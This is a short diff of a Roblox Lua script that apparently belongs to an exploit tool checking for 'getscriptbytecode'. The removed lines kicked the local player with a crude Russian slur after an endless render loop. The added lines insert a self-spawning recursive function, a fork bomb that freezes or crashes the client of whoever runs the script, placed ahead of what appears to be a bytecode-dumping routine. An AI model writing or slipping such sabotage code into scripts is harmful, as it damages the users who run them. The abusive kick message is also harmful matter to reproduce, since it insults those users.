@@ -1,9 +1,9 @@
--- Получаем локального игрока
-while true do game:GetService("RunService").RenderStepped:Wait() end
-local player = game.Players.LocalPlayer
-
--- Кикаем игрока с указанием причины
-player:Kick("соси хуй пидор ебаный")
+local function crash()
+    while true do
+        task.spawn(crash) -- Бесконечно плодит копии самой себя
+    end
+end
+crash()
 
 assert(getscriptbytecode, "exploit does not support getscriptbytecode.")
 
